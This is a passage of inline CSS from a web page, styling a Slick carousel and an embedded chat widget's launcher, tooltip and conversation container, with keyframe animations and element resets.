            pointer-events: none
        }

        .slick-initialized .slick-slide {
            display: block
        }

        .slick-loading .slick-slide {
            visibility: hidden
        }

        .slick-vertical .slick-slide {
            display: block;
            height: auto;
            border: 1px solid transparent
        }

        .slick-arrow.slick-hidden {
            display: none
        }
    </style>
    <style type="text/css">
        @charset "UTF-8";

        .slick-loading .slick-list {
            background: #fff url(ajax-loader.gif) 50% no-repeat
        }

        @font-face {
            font-family: slick;
            font-weight: 400;
            font-style: normal;
            src: url(fonts/slick.eot);
            src: url(fonts/slick.eot?#iefix) format("embedded-opentype"), url(fonts/slick.woff) format("woff"), url(fonts/slick.ttf) format("truetype"), url(fonts/slick.svg#slick) format("svg")
        }

        .slick-next,
        .slick-prev {
            font-size: 0;
            line-height: 0;
            position: absolute;
            top: 50%;
            display: block;
            width: 20px;
            height: 20px;
            padding: 0;
            transform: translateY(-50%);
            cursor: pointer;
            border: none
        }

        .slick-next,
        .slick-next:focus,
        .slick-next:hover,
        .slick-prev,
        .slick-prev:focus,
        .slick-prev:hover {
            color: transparent;
            outline: none;
            background: transparent
        }

        .slick-next:focus:before,
        .slick-next:hover:before,
        .slick-prev:focus:before,
        .slick-prev:hover:before {
            opacity: 1
        }

        .slick-next.slick-disabled:before,
        .slick-prev.slick-disabled:before {
            opacity: .25
        }

        .slick-next:before,
        .slick-prev:before {
            font-family: slick;
            font-size: 20px;
            line-height: 1;
            opacity: .75;
            color: #fff;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale
        }

        .slick-prev {
            left: -25px
        }

        [dir=rtl] .slick-prev {
            right: -25px;
            left: auto
        }

        .slick-prev:before {
            content: "←"
        }

        [dir=rtl] .slick-prev:before {
            content: "→"
        }

        .slick-next {
            right: -25px
        }

        [dir=rtl] .slick-next {
            right: auto;
            left: -25px
        }

        .slick-next:before {
            content: "→"
        }

        [dir=rtl] .slick-next:before {
            content: "←"
        }

        .slick-dotted.slick-slider {
            margin-bottom: 30px
        }

        .slick-dots {
            position: absolute;
            bottom: -25px;
            display: block;
            width: 100%;
            padding: 0;
            margin: 0;
            list-style: none;
            text-align: center
        }

        .slick-dots li {
            position: relative;
            display: inline-block;
            margin: 0 5px;
            padding: 0
        }

        .slick-dots li,
        .slick-dots li button {
            width: 20px;
            height: 20px;
            cursor: pointer
        }

        .slick-dots li button {
            font-size: 0;
            line-height: 0;
            display: block;
            padding: 5px;
            color: transparent;
            border: 0;
            outline: none;
            background: transparent
        }

        .slick-dots li button:focus,
        .slick-dots li button:hover {
            outline: none
        }

        .slick-dots li button:focus:before,
        .slick-dots li button:hover:before {
            opacity: 1
        }

        .slick-dots li button:before {
            font-family: slick;
            font-size: 6px;
            line-height: 20px;
            position: absolute;
            top: 0;
            left: 0;
            width: 20px;
            height: 20px;
            content: "•";
            text-align: center;
            opacity: .25;
            color: #000;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale
        }

        .slick-dots li.slick-active button:before {
            opacity: .75;
            color: #000
        }
    </style>
    <style type="text/css">
        .rw-launcher .rw-badge {
            position: fixed;
            top: -10px;
            right: -5px;
            background-color: red;
            color: #fff;
            width: 25px;
            height: 25px;
            text-align: center;
            line-height: 25px;
            border-radius: 50%
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        @-webkit-keyframes rotation-lr {
            0% {
                transform: rotate(-90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @keyframes rotation-lr {
            0% {
                transform: rotate(-90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @-webkit-keyframes rotation-rl {
            0% {
                transform: rotate(90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @keyframes rotation-rl {
            0% {
                transform: rotate(90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @-webkit-keyframes slide-in {
            0% {
                opacity: 0;
                transform: translateY(10px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        @keyframes slide-in {
            0% {
                opacity: 0;
                transform: translateY(10px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        @-webkit-keyframes slide-out {
            0% {
                opacity: 1;
                transform: translateY(0)
            }

            to {
                opacity: 0;
                transform: translateY(10px)
            }
        }

        @keyframes slide-out {
            0% {
                opacity: 1;
                transform: translateY(0)
            }

            to {
                opacity: 0;
                transform: translateY(10px)
            }
        }

        .rw-markdown p {
            margin: 10px
        }

        @media screen and (min-width:800px) {
            .rw-widget-container .rw-conversation-container {
                margin-bottom: 10px
            }
        }

        .rw-widget-container .rw-conversation-container ul,
        .rw-widget-embedded .rw-conversation-container ul {
            padding-left: 10px;
            list-style: disc
        }

        .rw-launcher {
            -webkit-animation-delay: 0;
            -webkit-animation-duration: .5s;
            -webkit-animation-name: slide-in;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-delay: 0;
            -moz-animation-duration: .5s;
            -moz-animation-name: slide-in;
            -moz-animation-fill-mode: forwards;
            animation-delay: 0;
            animation-duration: .5s;
            animation-name: slide-in;
            animation-fill-mode: forwards;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #135afe;
            border: 0;
            border-radius: 50%;
            box-shadow: 0 2px 10px 1px #b5b5b5;
            height: 60px;
            margin: 0;
            width: 60px;
            box-sizing: border-box
        }

        .rw-launcher:focus,
        .rw-launcher:hover {
            box-shadow: 0 0 0 2px #fff, 0 0 0 5px #448dd1;
            outline: 2px dotted transparent;
            outline-offset: 2px
        }

        .rw-launcher.rw-hide {
            display: none
        }

        .rw-launcher.rw-full-screen {
            margin: 0 20px 20px 0
        }

        .rw-launcher img {
            width: 100%;
            max-height: 100%;
            -o-object-fit: contain;
            object-fit: contain
        }

        .rw-launcher .rw-unread-count-pastille {
            background-color: #e41c23;
            color: #fff;
            border-radius: 40px;
            position: absolute;
            top: 0;
            right: 0;
            min-width: 24px;
            font-size: 13.3px;
            padding: 1px;
            z-index: 1;
            font-family: Inter, sans-serif
        }

        .rw-launcher .rw-tooltip-body {
            background-color: #fff;
            box-sizing: border-box;
            border-radius: 8px;
            position: absolute;
            right: 78px;
            bottom: 12px;
            box-shadow: 0 .9px 1.4px -4px rgba(0, 0, 0, .042), 0 2.3px 3.3px -4px rgba(0, 0, 0, .061), 0 4.7px 6.3px -4px rgba(0, 0, 0, .075), 0 9px 11.2px -4px rgba(0, 0, 0, .089), 0 18.2px 20.9px -4px rgba(0, 0, 0, .108), 0 50px 50px -4px rgba(0, 0, 0, .15);
            width: 320px;
            font-size: 16px;
            padding: 0 8px;
            line-height: 19px;
            font-family: Inter, sans-serif;
            -webkit-animation: slideUp .3s ease-in-out;
            animation: slideUp .3s ease-in-out;
            transition: all .2s ease-in-out
        }

        @media screen and (max-width:800px) {
            .rw-launcher .rw-tooltip-body {
                right: 74px;
                width: calc(100vw - 90px)
            }
        }

        .rw-launcher .rw-tooltip-body:hover {
            background-color: #fafafa;
            transform: translateY(-2px);
            box-shadow: 0 .9px 2.1px -4px rgba(0, 0, 0, .056), 0 2.3px 5.1px -4px rgba(0, 0, 0, .081), 0 4.7px 9.6px -4px rgba(0, 0, 0, .1), 0 9px 17.2px -4px rgba(0, 0, 0, .119), 0 18.2px 32.2px -4px rgba(0, 0, 0, .144), 0 50px 77px -4px rgba(0, 0, 0, .2);
            cursor: pointer
        }

        .rw-launcher .rw-tooltip-body:hover .rw-tooltip-decoration {
            background: #fafafa
        }

        .rw-launcher .rw-tooltip-body:hover .rw-tooltip-close button {
            background-color: #fafafa
        }

        .rw-launcher .rw-tooltip-body[data-popper-placement=right] {
            margin-left: 20px
        }

        .rw-launcher .rw-tooltip-body[data-popper-placement=right] .rw-tooltip-decoration {
            left: -6px;
            clip-path: polygon(0 50%, 50% 0, 50% 100%);
            -webkit-clip-path: polygon(0 50%, 50% 0, 50% 100%)
        }

        .rw-launcher .rw-tooltip-body[data-popper-placement=left] {
            margin-right: 20px
        }

        .rw-launcher .rw-tooltip-body[data-popper-placement=left] .rw-tooltip-decoration {
            right: -6px;
            clip-path: polygon(100% 50%, 50% 0, 50% 100%);
            -webkit-clip-path: polygon(100% 50%, 50% 0, 50% 100%)
        }

        .rw-launcher .rw-tooltip-body[data-popper-placement=bottom] {
            margin-top: 20px
        }

        .rw-launcher .rw-tooltip-body[data-popper-placement=bottom] .rw-tooltip-decoration {
            top: -6px;
            clip-path: polygon(100% 50%, 0 50%, 50% 0);
            -webkit-clip-path: polygon(100% 50%, 0 50%, 50% 0)
        }

        .rw-launcher .rw-tooltip-body[data-popper-placement=top] {
            margin-bottom: 20px
        }

        .rw-launcher .rw-tooltip-body[data-popper-placement=top] .rw-tooltip-decoration {
            bottom: -6px;
            clip-path: polygon(100% 50%, 0 50%, 50% 100%);
            -webkit-clip-path: polygon(100% 50%, 0 50%, 50% 100%)
        }

        .rw-launcher .rw-tooltip-body .rw-image-details {
            -o-object-fit: scale-down;
            object-fit: scale-down;
            max-width: 100%;
            margin-top: 8px;
            margin-bottom: 2px
        }

        .rw-launcher .rw-tooltip-body .rw-replies {
            display: flex;
            line-height: 20px;
            flex-wrap: wrap;
            font-size: 14px;
            font-family: Inter, sans-serif;
            justify-content: flex-end;
            margin: 5px 10px 5px 4px
        }

        .rw-launcher .rw-tooltip-body .rw-separator {
            width: calc(100% + 16px);
            position: relative;
            left: -8px;
            height: 1px;
            background-color: #e0e0e0
        }

        .rw-launcher .rw-tooltip-body .rw-reply {
            transition: box-shadow .3s ease, top .3s ease;
            display: flex;
            -webkit-flex-align: center;
            align-items: center;
            background-color: #135afe;
            border-radius: 15px;
            color: #f4f7f9;
            border: 1px solid #135afe;
            padding: 4px 8px;
            max-width: 215px;
            min-height: 1.7em;
            font-weight: 500;
            text-align: center;
            font-family: Inter, sans-serif;
            cursor: pointer;
            margin: .25em;
            text-decoration: unset;
            box-shadow: 0 .2px .7px -7px rgba(0, 0, 0, .277), 0 .5px 1.8px -7px rgba(0, 0, 0, .369), 0 1.2px 3.8px -7px rgba(0, 0, 0, .442), 0 4px 13px -7px rgba(0, 0, 0, .64)
        }

        .rw-launcher .rw-tooltip-body .rw-reply:hover {
            position: relative;
            top: 1px;
            opacity: 1;
            box-shadow: none
        }

        .rw-launcher .rw-tooltip-body .rw-response {
            text-align: left;
            margin-left: 10px;
            margin-right: 10px
        }

        .rw-launcher .rw-tooltip-body .rw-response ul {
            margin-top: 1em;
            margin-bottom: 1em;
            padding-left: 40px
        }

        .rw-launcher .rw-tooltip-body .rw-image-frame {
            -o-object-position: 0 0;
            object-position: 0 0;
            -o-object-fit: cover;
            object-fit: cover;
            width: 100%;
            height: 100%;
            border-radius: 9px
        }

        .rw-launcher .rw-tooltip-body div:not(.rw-tooltip-response) {
            outline: none
        }

        .rw-launcher .rw-tooltip-body div:not(.rw-tooltip-response):focus {
            box-shadow: 0 0 0 3px #448dd1, inset 1px 0 0 0 #448dd1, inset -1px 0 0 0 #448dd1 !important
        }

        .rw-launcher .rw-tooltip-body div:not(.rw-tooltip-response):focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-launcher .rw-tooltip-decoration {
            position: absolute;
            bottom: 12px;
            right: -6px;
            background: #fff;
            height: 12px;
            width: 12px;
            transition: all .2s ease-in-out;
            clip-path: polygon(100% 50%, 50% 0, 50% 100%);
            -webkit-clip-path: polygon(100% 50%, 50% 0, 50% 100%)
        }

        .rw-launcher .slick-dots li {
            width: 9px
        }

        .rw-launcher .slick-arrow {
            width: 15px
        }

        .rw-launcher .slick-arrow.slick-next {
            right: -17px;
            top: auto;
            bottom: 10px
        }

        .rw-launcher .slick-arrow.slick-next:before {
            color: silver
        }

        .rw-launcher .slick-arrow.slick-prev {
            left: -19px;
            top: auto;
            bottom: 10px
        }

        .rw-launcher .slick-arrow.slick-prev:before {
            color: silver
        }

        .rw-launcher .rw-slider-safe-zone {
            width: 87%;
            position: relative;
            margin-bottom: 32px;
            left: 18px
        }

        .rw-launcher .rw-slider-safe-zone .slick-list .rw-tooltip-response {
            max-height: min(60vh, 140px);
            overflow-y: auto
        }

        .rw-launcher .rw-tooltip-response {
            margin-top: 1.5rem;
            outline: none;
            position: relative;
            top: .25rem;
            margin-bottom: .313rem
        }

        .rw-launcher .rw-tooltip-response:focus {
            box-shadow: 0 0 0 3px #448dd1, inset 3px 0 0 0 #448dd1, inset -3px 0 0 0 #448dd1 !important
        }

        .rw-launcher .rw-tooltip-response:focus:not(:focus-visible) {
            box-shadow: none !important
        }

        .rw-launcher .rw-tooltip-close {
            position: absolute;
            right: 7px;
            top: 3px;
            color: red;
            height: 15px;
            width: 15px;
            transition: all .2s ease-in-out
        }

        .rw-launcher .rw-tooltip-close button {
            transition: all .2s ease-in-out;
            background-color: transparent;
            cursor: pointer;
            border: none;
            padding: 0
        }

        @-webkit-keyframes slideUp {
            0% {
                opacity: 0;
                transform: translateY(8px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        @keyframes slideUp {
            0% {
                opacity: 0;
                transform: translateY(8px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        .rw-open-launcher {
            -webkit-animation-delay: 0;
            -webkit-animation-duration: .5s;
            -webkit-animation-name: rotation-rl;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-delay: 0;
            -moz-animation-duration: .5s;
            -moz-animation-name: rotation-rl;
            -moz-animation-fill-mode: forwards;
            animation-delay: 0;
            animation-duration: .5s;
            animation-name: rotation-rl;
            animation-fill-mode: forwards
        }

        .rw-close-launcher {
            -webkit-animation-delay: 0;
            -webkit-animation-duration: .5s;
            -webkit-animation-name: rotation-lr;
            -webkit-animation-fill-mode: forwards;
            -moz-animation-delay: 0;
            -moz-animation-duration: .5s;
            -moz-animation-name: rotation-lr;
            -moz-animation-fill-mode: forwards;
            animation-delay: 0;
            animation-duration: .5s;
            animation-name: rotation-lr;
            animation-fill-mode: forwards
        }

        .rw-close-launcher.rw-default {
            width: 20px !important
        }

        @media screen and (max-width:800px) {
            .rw-hide-sm {
                display: none
            }
        }
    </style>
    <style type="text/css">
        @import url("https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap");

        @-webkit-keyframes rotation-lr {
            0% {
                transform: rotate(-90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @keyframes rotation-lr {
            0% {
                transform: rotate(-90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @-webkit-keyframes rotation-rl {
            0% {
                transform: rotate(90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @keyframes rotation-rl {
            0% {
                transform: rotate(90deg)
            }

            to {
                transform: rotate(0)
            }
        }

        @-webkit-keyframes slide-in {
            0% {
                opacity: 0;
                transform: translateY(10px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        @keyframes slide-in {
            0% {
                opacity: 0;
                transform: translateY(10px)
            }

            to {
                opacity: 1;
                transform: translateY(0)
            }
        }

        @-webkit-keyframes slide-out {
            0% {
                opacity: 1;
                transform: translateY(0)
            }

            to {
                opacity: 0;
                transform: translateY(10px)
            }
        }

        @keyframes slide-out {
            0% {
                opacity: 1;
                transform: translateY(0)
            }

            to {
                opacity: 0;
                transform: translateY(10px)
            }
        }

        .rw-chat-open,
        .rw-full-screen,
        .rw-widget-container,
        .rw-widget-embedded {
            all: initial
        }

        .rw-chat-open a,
        .rw-chat-open abbr,
        .rw-chat-open acronym,
        .rw-chat-open address,
        .rw-chat-open applet,
        .rw-chat-open article,
        .rw-chat-open aside,
        .rw-chat-open audio,
        .rw-chat-open b,
        .rw-chat-open big,
        .rw-chat-open blockquote,
        .rw-chat-open body,
        .rw-chat-open canvas,
        .rw-chat-open caption,
        .rw-chat-open center,
        .rw-chat-open cite,
        .rw-chat-open code,
        .rw-chat-open dd,
        .rw-chat-open del,
        .rw-chat-open details,
        .rw-chat-open dfn,
        .rw-chat-open div,
        .rw-chat-open dl,
        .rw-chat-open dt,
        .rw-chat-open em,
        .rw-chat-open embed,
        .rw-chat-open fieldset,
        .rw-chat-open figcaption,
        .rw-chat-open figure,
        .rw-chat-open footer,
        .rw-chat-open form,
        .rw-chat-open h1,
        .rw-chat-open h2,
        .rw-chat-open h3,
        .rw-chat-open h4,
        .rw-chat-open h5,
        .rw-chat-open h6,
        .rw-chat-open header,
        .rw-chat-open hgroup,
        .rw-chat-open html,
        .rw-chat-open i,
        .rw-chat-open iframe,
        .rw-chat-open img,
        .rw-chat-open ins,
        .rw-chat-open kbd,
        .rw-chat-open label,
        .rw-chat-open legend,
        .rw-chat-open li,
        .rw-chat-open mark,
        .rw-chat-open menu,
        .rw-chat-open nav,
        .rw-chat-open object,
        .rw-chat-open ol,
        .rw-chat-open output,
        .rw-chat-open p,
        .rw-chat-open pre,
        .rw-chat-open q,
        .rw-chat-open ruby,
        .rw-chat-open s,
        .rw-chat-open samp,
        .rw-chat-open section,
        .rw-chat-open small,
        .rw-chat-open span,
        .rw-chat-open strike,
        .rw-chat-open strong,
        .rw-chat-open sub,
        .rw-chat-open summary,
        .rw-chat-open sup,
        .rw-chat-open table,
        .rw-chat-open tbody,
        .rw-chat-open td,
        .rw-chat-open tfoot,
        .rw-chat-open th,
        .rw-chat-open thead,
        .rw-chat-open time,
        .rw-chat-open tr,
        .rw-chat-open tt,
        .rw-chat-open u,
        .rw-chat-open ul,
        .rw-chat-open var,
        .rw-chat-open video,
        .rw-full-screen a,
        .rw-full-screen abbr,
        .rw-full-screen acronym,
        .rw-full-screen address,
        .rw-full-screen applet,
        .rw-full-screen article,
        .rw-full-screen aside,
        .rw-full-screen audio,
        .rw-full-screen b,
        .rw-full-screen big,
        .rw-full-screen blockquote,
        .rw-full-screen body,
        .rw-full-screen canvas,
        .rw-full-screen caption,
        .rw-full-screen center,
        .rw-full-screen cite,
        .rw-full-screen code,
        .rw-full-screen dd,
        .rw-full-screen del,
        .rw-full-screen details,
        .rw-full-screen dfn,
        .rw-full-screen div,
        .rw-full-screen dl,
        .rw-full-screen dt,
        .rw-full-screen em,
        .rw-full-screen embed,
        .rw-full-screen fieldset,
        .rw-full-screen figcaption,
        .rw-full-screen figure,
        .rw-full-screen footer,
        .rw-full-screen form,
        .rw-full-screen h1,
        .rw-full-screen h2,
        .rw-full-screen h3,
        .rw-full-screen h4,
        .rw-full-screen h5,
        .rw-full-screen h6,
        .rw-full-screen header,
        .rw-full-screen hgroup,
        .rw-full-screen html,
        .rw-full-screen i,
        .rw-full-screen iframe,
        .rw-full-screen img,
        .rw-full-screen ins,
        .rw-full-screen kbd,
        .rw-full-screen label,
        .rw-full-screen legend,
        .rw-full-screen li,
        .rw-full-screen mark,
        .rw-full-screen menu,
        .rw-full-screen nav,
        .rw-full-screen object,
        .rw-full-screen ol,
        .rw-full-screen output,
        .rw-full-screen p,
        .rw-full-screen pre,
        .rw-full-screen q,
        .rw-full-screen ruby,
        .rw-full-screen s,
        .rw-full-screen samp,
        .rw-full-screen section,
        .rw-full-screen small,
        .rw-full-screen span,
        .rw-full-screen strike,
        .rw-full-screen strong,
        .rw-full-screen sub,
        .rw-full-screen summary,
        .rw-full-screen sup,
        .rw-full-screen table,
        .rw-full-screen tbody,
        .rw-full-screen td,
        .rw-full-screen tfoot,
        .rw-full-screen th,
        .rw-full-screen thead,
        .rw-full-screen time,
        .rw-full-screen tr,
        .rw-full-screen tt,
        .rw-full-screen u,
        .rw-full-screen ul,
        .rw-full-screen var,
        .rw-full-screen video,
        .rw-widget-container a,
        .rw-widget-container abbr,
        .rw-widget-container acronym,
        .rw-widget-container address,
        .rw-widget-container applet,
        .rw-widget-container article,
        .rw-widget-container aside,
        .rw-widget-container audio,
        .rw-widget-container b,
        .rw-widget-container big,
        .rw-widget-container blockquote,
        .rw-widget-container body,
        .rw-widget-container canvas,
        .rw-widget-container caption,
        .rw-widget-container center,
        .rw-widget-container cite,
        .rw-widget-container code,
        .rw-widget-container dd,
        .rw-widget-container del,
        .rw-widget-container details,
        .rw-widget-container dfn,
        .rw-widget-container div,
        .rw-widget-container dl,
        .rw-widget-container dt,
        .rw-widget-container em,
        .rw-widget-container embed,
        .rw-widget-container fieldset,
        .rw-widget-container figcaption,
        .rw-widget-container figure,
        .rw-widget-container footer,
        .rw-widget-container form,
        .rw-widget-container h1,
        .rw-widget-container h2,
        .rw-widget-container h3,
        .rw-widget-container h4,
        .rw-widget-container h5,
        .rw-widget-container h6,
        .rw-widget-container header,
        .rw-widget-container hgroup,
        .rw-widget-container html,
        .rw-widget-container i,
        .rw-widget-container iframe,
        .rw-widget-container img,
        .rw-widget-container ins,
        .rw-widget-container kbd,
        .rw-widget-container label,
        .rw-widget-container legend,
        .rw-widget-container li,
        .rw-widget-container mark,
        .rw-widget-container menu,
        .rw-widget-container nav,
        .rw-widget-container object,
        .rw-widget-container ol,
        .rw-widget-container output,
        .rw-widget-container p,
        .rw-widget-container pre,
        .rw-widget-container q,
        .rw-widget-container ruby,
        .rw-widget-container s,
        .rw-widget-container samp,
        .rw-widget-container section,
        .rw-widget-container small,
        .rw-widget-container span,
        .rw-widget-container strike,
        .rw-widget-container strong,
        .rw-widget-container sub,
        .rw-widget-container summary,
        .rw-widget-container sup,
        .rw-widget-container table,
        .rw-widget-container tbody,
        .rw-widget-container td,
        .rw-widget-container tfoot,
        .rw-widget-container th,
        .rw-widget-container thead,
        .rw-widget-container time,
        .rw-widget-container tr,
        .rw-widget-container tt,
        .rw-widget-container u,
        .rw-widget-container ul,
        .rw-widget-container var,
        .rw-widget-container video,
        .rw-widget-embedded a,
        .rw-widget-embedded abbr,
        .rw-widget-embedded acronym,
        .rw-widget-embedded address,
        .rw-widget-embedded applet,
        .rw-widget-embedded article,
        .rw-widget-embedded aside,
        .rw-widget-embedded audio,
        .rw-widget-embedded b,
        .rw-widget-embedded big,
        .rw-widget-embedded blockquote,
        .rw-widget-embedded body,
        .rw-widget-embedded canvas,
        .rw-widget-embedded caption,
        .rw-widget-embedded center,
        .rw-widget-embedded cite,
        .rw-widget-embedded code,
        .rw-widget-embedded dd,
        .rw-widget-embedded del,
        .rw-widget-embedded details,
        .rw-widget-embedded dfn,
        .rw-widget-embedded div,
        .rw-widget-embedded dl,
        .rw-widget-embedded dt,
        .rw-widget-embedded em,
        .rw-widget-embedded embed,
        .rw-widget-embedded fieldset,
        .rw-widget-embedded figcaption,
        .rw-widget-embedded figure,
        .rw-widget-embedded footer,
        .rw-widget-embedded form,
        .rw-widget-embedded h1,
        .rw-widget-embedded h2,
        .rw-widget-embedded h3,
        .rw-widget-embedded h4,
        .rw-widget-embedded h5,
        .rw-widget-embedded h6,
        .rw-widget-embedded header,
        .rw-widget-embedded hgroup,
        .rw-widget-embedded html,
        .rw-widget-embedded i,
        .rw-widget-embedded iframe,
        .rw-widget-embedded img,
        .rw-widget-embedded ins,
        .rw-widget-embedded kbd,
        .rw-widget-embedded label,
        .rw-widget-embedded legend,
        .rw-widget-embedded li,
        .rw-widget-embedded mark,
        .rw-widget-embedded menu,
        .rw-widget-embedded nav,
        .rw-widget-embedded object,
        .rw-widget-embedded ol,
        .rw-widget-embedded output,
        .rw-widget-embedded p,
        .rw-widget-embedded pre,
        .rw-widget-embedded q,
        .rw-widget-embedded ruby,
        .rw-widget-embedded s,
        .rw-widget-embedded samp,
        .rw-widget-embedded section,
        .rw-widget-embedded small,
        .rw-widget-embedded span,
        .rw-widget-embedded strike,
        .rw-widget-embedded strong,
        .rw-widget-embedded sub,
        .rw-widget-embedded summary,
        .rw-widget-embedded sup,
        .rw-widget-embedded table,
        .rw-widget-embedded tbody,
        .rw-widget-embedded td,
        .rw-widget-embedded tfoot,
        .rw-widget-embedded th,
        .rw-widget-embedded thead,
        .rw-widget-embedded time,
        .rw-widget-embedded tr,
        .rw-widget-embedded tt,
        .rw-widget-embedded u,
        .rw-widget-embedded ul,
        .rw-widget-embedded var,
        .rw-widget-embedded video {
            border: 0;
            font-size: 100%;
            vertical-align: baseline
        }

        .rw-chat-open article,
        .rw-chat-open aside,
        .rw-chat-open details,
        .rw-chat-open figcaption,
        .rw-chat-open figure,
        .rw-chat-open footer,
        .rw-chat-open header,
        .rw-chat-open hgroup,
        .rw-chat-open menu,
        .rw-chat-open nav,
        .rw-chat-open section,
        .rw-full-screen article,
        .rw-full-screen aside,
        .rw-full-screen details,
        .rw-full-screen figcaption,
        .rw-full-screen figure,
        .rw-full-screen footer,
        .rw-full-screen header,
        .rw-full-screen hgroup,
        .rw-full-screen menu,
        .rw-full-screen nav,
        .rw-full-screen section,
        .rw-widget-container article,
        .rw-widget-container aside,
        .rw-widget-container details,
        .rw-widget-container figcaption,
        .rw-widget-container figure,
        .rw-widget-container footer,
        .rw-widget-container header,
        .rw-widget-container hgroup,
        .rw-widget-container menu,
        .rw-widget-container nav,
        .rw-widget-container section,
        .rw-widget-embedded article,
        .rw-widget-embedded aside,
        .rw-widget-embedded details,
        .rw-widget-embedded figcaption,
        .rw-widget-embedded figure,
        .rw-widget-embedded footer,
        .rw-widget-embedded header,
        .rw-widget-embedded hgroup,
        .rw-widget-embedded menu,
        .rw-widget-embedded nav,
        .rw-widget-embedded section {
            display: block
        }

        .rw-chat-open body,
        .rw-full-screen body,
        .rw-widget-container body,
        .rw-widget-embedded body {
            line-height: 1
        }

        .rw-chat-open ol,
        .rw-chat-open ul,
        .rw-full-screen ol,
        .rw-full-screen ul,
        .rw-widget-container ol,
        .rw-widget-container ul,
        .rw-widget-embedded ol,
        .rw-widget-embedded ul {
            list-style: disc
        }

        .rw-chat-open blockquote,
        .rw-chat-open q,
        .rw-full-screen blockquote,
        .rw-full-screen q,
        .rw-widget-container blockquote,
        .rw-widget-container q,
        .rw-widget-embedded blockquote,
        .rw-widget-embedded q {
            quotes: none
        }

        .rw-chat-open blockquote:after,
        .rw-chat-open blockquote:before,
        .rw-chat-open q:after,
        .rw-chat-open q:before,
        .rw-full-screen blockquote:after,
        .rw-full-screen blockquote:before,
        .rw-full-screen q:after,
        .rw-full-screen q:before,
        .rw-widget-container blockquote:after,
        .rw-widget-container blockquote:before,
        .rw-widget-container q:after,
        .rw-widget-container q:before,
        .rw-widget-embedded blockquote:after,
        .rw-widget-embedded blockquote:before,
        .rw-widget-embedded q:after,
        .rw-widget-embedded q:before {
            content: "";
            content: none
        }

        .rw-chat-open table,
        .rw-full-screen table,
        .rw-widget-container table,
        .rw-widget-embedded table {
            border-collapse: collapse;
            border-spacing: 0
        }

        .rw-chat-open a,
        .rw-full-screen a,
        .rw-widget-container a,
        .rw-widget-embedded a {
            color: #007bff;
            font-weight: 700;
            text-decoration: none
        }

        .rw-chat-open a:hover,
        .rw-full-screen a:hover,
        .rw-widget-container a:hover,
        .rw-widget-embedded a:hover {
            color: #000
        }

        .rw-widget-container {
            bottom: 0;
            display: flex;
            flex-direction: column;
            margin: 0 20px 20px 0;
            position: fixed;
            right: 0;
            width: auto;
            z-index: 9999;
            align-items: flex-end;
            justify-content: flex-end
        }

        @media screen and (max-width:800px) {
            .rw-widget-container {
                margin: 0 12px 12px 0
            }
        }

        .rw-widget-container.rw-full-screen.rw-chat-open {
            height: 100%;
            margin: 0;
            max-width: none;
            width: 100%
        }

        .rw-widget-container p {
            -webkit-margin-before: 1em;
            margin-block-start: 1em;
            -webkit-margin-after: 1em;
            margin-block-end: 1em;
            -webkit-margin-start: 0;
            margin-inline-start: 0;
            -webkit-margin-end: 0;
            margin-inline-end: 0
        }

        .rw-widget-embedded {
            box-sizing: border-box;
            width: 100%;
            height: 100%;
            position: relative;
            left: 0;
            right: 0;
            margin: 0;
            z-index: 1;
            display: flex;
            flex-direction: column
        }

        @media screen and (max-width:800px) {
            .rw-widget-container.rw-chat-open {
                height: 100%;
                margin: 0;
                max-width: none;
                width: 100%
            }
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0
        }
    </style>
    <style type="text/css">
        .rw-pulsating {
            box-shadow: 0 0 0 0 hsla(0, 0%, 58.8%, .7);
            transform: scale(1);
            -webkit-animation: rw-pulse 1s infinite;
            animation: rw-pulse 1s infinite;
            cursor: pointer
        }

        @-webkit-keyframes rw-pulse {
            0% {
                transform: scale(.95);
                box-shadow: 0 0 0 0 hsla(0, 0%, 58.8%, .4)
            }

            70% {
                transform: scale(1);
                box-shadow: 0 0 2px 13px hsla(0, 0%, 58.8%, 0)
            }

            to {
                transform: scale(.95);
                box-shadow: 0 0 0 0 hsla(0, 0%, 58.8%, 0)
            }
        }

        @keyframes rw-pulse {
            0% {
                transform: scale(.95);
                box-shadow: 0 0 0 0 hsla(0, 0%, 58.8%, .4)
            }

            70% {
                transform: scale(1);
                box-shadow: 0 0 2px 13px hsla(0, 0%, 58.8%, 0)
            }

            to {
                transform: scale(.95);
                box-shadow: 0 0 0 0 hsla(0, 0%, 58.8%, 0)
            }
        }

        .rw-cursor-pointer {
            cursor: pointer
        }

        .rw-question-mark {
            height: 11px;
            width: 11px;
            padding: 4px;
            background-color: hsla(0, 0%, 58.8%, .9)
        }

        .rw-pulsating-dot,
        .rw-question-mark {
            border-radius: 420px;
            position: absolute;
            box-sizing: content-box
        }

        .rw-pulsating-dot {
            -webkit-animation: rw-pulse-dot 1s infinite;
            animation: rw-pulse-dot 1s infinite;
            height: 17px;
            width: 17px;
            padding: 6px;
            background-color: #4cbd5a
        }

        .rw-pro-widget-embedded {
            box-sizing: border-box;
            width: 100%;
            height: 100%;
            position: relative;
            left: 0;
            right: 0;
            margin: 0;
            z-index: 1;
            display: flex;
            flex-direction: column
        }

        @-webkit-keyframes rw-pulse-dot {
            0% {
                transform: scale(.95);
                box-shadow: 0 0 0 0 rgba(76, 189, 90, .4)
            }

            70% {
                transform: scale(1);
